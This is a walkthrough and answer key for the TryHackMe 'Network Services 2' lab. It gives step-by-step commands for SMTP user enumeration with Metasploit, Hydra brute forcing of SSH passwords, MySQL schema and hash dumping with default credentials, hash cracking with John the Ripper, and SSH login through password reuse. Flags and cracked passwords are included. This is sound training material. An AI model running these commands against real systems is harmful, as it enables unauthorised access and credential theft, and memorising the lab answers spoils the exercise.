Room: https://tryhackme.com/room/networkservices2
Name: Network Services 2
///Task 6///
====
First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?
** nmap -sC -sV 10.10.50.153
25
===
Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this?
msfconsole 
===
Let's search for the module "smtp_version", what's it's full module name?
** search smtp_version
auxiliary/scanner/smtp/smtp_version
===
Great, now- select the module and list the options. How do we do this?
** use auxiliary/scanner/smtp/smtp_version
options
===
Have a look through the options, does everything seem correct? What is the option we need to set?
RHOSTS
===
Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?
** set RHOSTS 10.10.50.153
** run 
polosmtp.home
===
What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.
** After googling: "ESMTP Postfix (Ubuntu)\x0d\x0a" 
postfix
===
Good! We've now got a good amount of information on the target system to move onto the next stage. Let's search for the module "smtp_enum", what's it's full module name?
** back
** search smtp_enum
auxiliary/scanner/smtp/smtp_enum
===
What option do we need to set to the wordlist's path?
** info auxiliary/scanner/smtp/smtp_enum 
Under description section >> USER_FILE
===
Once we've set this option, what is the other essential paramater we need to set?
** use auxiliary/scanner/smtp/smtp_enum
** set USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
===
Once we've set this option, what is the other essential paramater we need to set?
RHOSTS
** set RHOSTS 10.10.50.153
===
Okay! Now that's finished, what username is returned?
** run
administrator
===
///Task 7///
===
What is the password of the user we found during our enumeration stage?
** hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.50.153 ssh
alejandro
===
Great! Now, let's SSH into the server as the user, what is contents of smtp.txt
** ssh administrator@10.10.50.153
** administrator@10.10.50.153's password: alejandro
** ls
** cat smtp.txt
THM{who_knew_email_servers_were_c00l?}
===
///Task 8///
===
What type of software is MySQL?
relational database management system
===
What language is MySQL based on?
SQL
===
What communication model does MySQL use?
client-server
===
What is a common application of MySQL?
back end database
===
What major social network uses MySQL as their back-end database? This will require further research.
Facebook
===
///Task 9///
===
As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using?
** nmap -sC -sV 10.10.143.144
3306
===
Search for, select and list the options it needs. What three options do we need to set? (in descending order).
** search mysql_sql
** use auxiliary/admin/mysql/mysql_sql
** info
from the Basic options: >> "PASSWORD/RHOSTS/USERNAME"
===
Run the exploit. By default it will test with the "select version()" command, what result does this give you?
** set PASSWORD password
** set RHOSTS 10.10.143.144
** set USERNAME root
** run
5.7.29-0ubuntu0.18.04.1
===
Great! We know that our exploit is landing as planned. Let's try to gain some more ambitious information. Change the "sql" option to "show databases". how many databases are returned?
** set sql show databases
** run
4
===
///Task 10///
===
First, let's search for and select the "mysql_schemadump" module. What's the module's full name?
** search mysql_schemadump
auxiliary/scanner/mysql/mysql_schemadump
===
Great! Now, you've done this a few times by now so I'll let you take it from here. Set the relevant options, run the exploit. What's the name of the last table that gets dumped?
** use auxiliary/scanner/mysql/mysql_schemadump
** set PASSWORD password
** set RHOSTS 10.10.143.144
** set USERNAME root
** run
x$waits_global_by_latency
===
Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better... search for and select the "mysql_hashdump" module. What's the module's full name?
** back
** search mysql_hashdump
auxiliary/scanner/mysql/mysql_hashdump
===
Again, I'll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?
** use auxiliary/scanner/mysql/mysql_hashdump
** set PASSWORD password
** set RHOSTS 10.10.143.144
** set USERNAME root
** run
carl >> password hash: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
===
Now, we need to crack the password! Let's try John the Ripper against it using: "john hash.txt" what is the password of the user we found?
** touch MYSQL_CARL
** nano MYSQL_CARL >> "*EA031893AA21444B170FC2162A56978B8CEECE18"
** john MYSQL_CARL
doggie
===
Awesome. Password reuse is not only extremely dangerous, but extremely common. What are the chances that this user has reused their password for a different service?
** ssh carl@10.10.143.144 >> password: doggie
** ls
**cat MySQL.txt
THM{congratulations_you_got_the_mySQL_flag}
===
Congratulations! You did it!
Congratulations! You did it!
Congratulations! You did it!